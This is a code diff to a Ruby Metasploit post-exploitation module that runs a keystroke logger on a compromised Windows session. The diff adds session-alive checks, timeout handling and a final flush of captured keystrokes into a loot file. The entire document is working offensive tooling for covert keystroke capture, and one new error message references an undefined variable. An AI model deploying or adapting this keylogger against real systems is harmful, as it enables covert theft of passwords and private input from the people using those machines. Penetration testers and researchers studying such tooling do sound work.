@@ -46,6 +46,11 @@ class MetasploitModule < Msf::Post
       ], self.class)
   end
 
+  def setup
+    @running = false
+    @logfile = nil
+  end
+
   # Run Method for when run command is issued
   def run
 
@@ -62,13 +67,14 @@ class MetasploitModule < Msf::Post
     end
 
     if startkeylogger
-      keycap(datastore['INTERVAL'],set_log)
+      @logfile = set_log
+      keycap
     end
   end
 
   # Returns the path name to the stored loot filename
   def set_log
-    store_loot("host.windows.keystrokes", "text/plain", session, "Keystroke log on #{sysinfo['Computer']} with user #{client.sys.config.getuid} started at #{Time.now.to_s}\n", "keystrokes.txt", "User Keystrokes")
+    store_loot("host.windows.keystrokes", "text/plain", session, "Keystroke log on #{sysinfo['Computer']} with user #{client.sys.config.getuid} started at #{Time.now.to_s}\n\n", "keystrokes.txt", "User Keystrokes")
   end
 
   def lock_screen
@@ -186,19 +192,28 @@ class MetasploitModule < Msf::Post
   # Method for starting the keylogger
   def startkeylogger()
     begin
-      #print_status("Grabbing Desktop Keyboard Input...")
-      #session.ui.grab_desktop
       print_status("Starting the keystroke sniffer...")
       session.ui.keyscan_start
+      @running = true
       return true
     rescue
       print_error("Failed to start the keystroke sniffer: #{$!}")
+      @running = false
       return false
     end
   end
 
+  def write_keylog_data
+    output = session.ui.keyscan_extract(session.ui.keyscan_dump)
+
+    if not output.empty?
+      print_good("Keystrokes captured #{output}") if datastore['ShowKeystrokes']
+      file_local_write(@logfile,"#{output}\n")
+    end
+  end
+
   # Method for writing found keystrokes
-  def write_keylog_data(logfile)
+  def write_keylog_data_old
     data = session.ui.keyscan_dump
     outp = ""
     data.unpack("n*").each do |inp|
@@ -226,36 +241,55 @@ class MetasploitModule < Msf::Post
       end
     end
 
-    sleep(2)
+    #sleep(2)
     if not outp.empty?
       print_good("Keystrokes captured #{outp}") if datastore['ShowKeystrokes']
-      file_local_write(logfile,"#{outp}\n")
+      file_local_write(@logfile,"#{outp}\n")
     end
   end
 
   # Method for Collecting Capture
-  def keycap(keytime, logfile)
-    begin
-      rec = 1
-      #Creating DB for captured keystrokes
-      print_status("Keystrokes being saved in to #{logfile}")
-      #Inserting keystrokes every number of seconds specified
-      print_status("Recording keystrokes...")
-      while rec == 1
-        write_keylog_data(logfile)
-        sleep(keytime.to_i)
+  def keycap
+    keytime = datastore['INTERVAL'].to_i
+    rec = 1
+    #Creating DB for captured keystrokes
+    print_status("Keystrokes being saved in to #{@logfile}")
+
+    #Inserting keystrokes every number of seconds specified
+    print_status("Recording keystrokes...")
+    while rec == 1
+      begin
+        if session.alive?
+          write_keylog_data
+          sleep(keytime)
+        else
+          print_status("Session has been closed. Exiting keylog recorder.")
+          rec = 0
+        end
+      rescue::Exception => e
+        if e.class.to_s == "Rex::TimeoutError"
+          print_error("Keylog Recorder has timed out. Session may be dead. Exiting...")
+        else
+          print_error("Keylog Recorder encountered error: #{error}. Exiting...")
+        end
+        @running = false
+        rec = 0
+        self.kill
       end
-    rescue::Exception => e
-      print_status "Saving last few keystrokes..."
-      write_keylog_data(logfile)
-      print_status("#{e.class} #{e}")
-      print_status("Stopping keystroke sniffer...")
-      session.ui.keyscan_stop
     end
   end
 
-  def cleanup
+  def finish_up
+    print_status "Saving last few keystrokes..."
+    write_keylog_data
+    sleep(datastore['INTERVAL'].to_i * 2)
+    write_keylog_data
+    print_status("Stopping keystroke sniffer...")
     session.ui.keyscan_stop rescue nil
+    @running = false
   end
 
+  def cleanup
+     finish_up if @running && session.alive?
+  end
 end
